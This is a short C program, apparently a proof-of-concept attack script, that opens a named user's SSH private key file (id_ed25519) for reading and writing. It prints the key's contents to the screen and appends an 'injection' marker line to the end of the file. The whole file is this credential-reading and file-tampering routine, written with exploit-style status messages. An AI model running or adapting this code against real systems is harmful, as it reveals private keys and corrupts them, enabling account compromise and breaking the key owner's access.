#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>

#define TARGET_FILE "/home/milad/.ssh/id_ed25519"
#define BUFFER_SIZE 512

int main(void) {
    int fd;
    ssize_t bytesRead, bytesWritten;
    char buffer[BUFFER_SIZE] = {0};
    off_t offset = 0;


    fd = open(TARGET_FILE, O_RDWR);  
    if (fd == -1) {
        perror("[-] open failed");
        return EXIT_FAILURE;
    }

    bytesRead = pread(fd, buffer, BUFFER_SIZE, offset);
    if (bytesRead == -1) {
        perror("[-] pread failed");
        close(fd);
        return EXIT_FAILURE;
    }
    
    printf("[+] Read %zd bytes from %s:\n\n", bytesRead, TARGET_FILE);
    write(STDOUT_FILENO, buffer, bytesRead);
    printf("\n");

    const char *msg = "\n# You can found me in Linkedin - Milad Cheraghi \n test injection by poc \n";
    offset = lseek(fd, 0, SEEK_END);  
    if (offset == -1) {
        perror("[-] lseek failed");
        close(fd);
        return EXIT_FAILURE;
    }

    bytesWritten = pwrite(fd, msg, strlen(msg), offset);
    if (bytesWritten == -1) {
        perror("[-] pwrite failed (maybe file is readonly)");
    } else {
        printf("[+] Wrote %zd bytes to the end of the file.\n", bytesWritten);
    }

    close(fd);
    return EXIT_SUCCESS;
}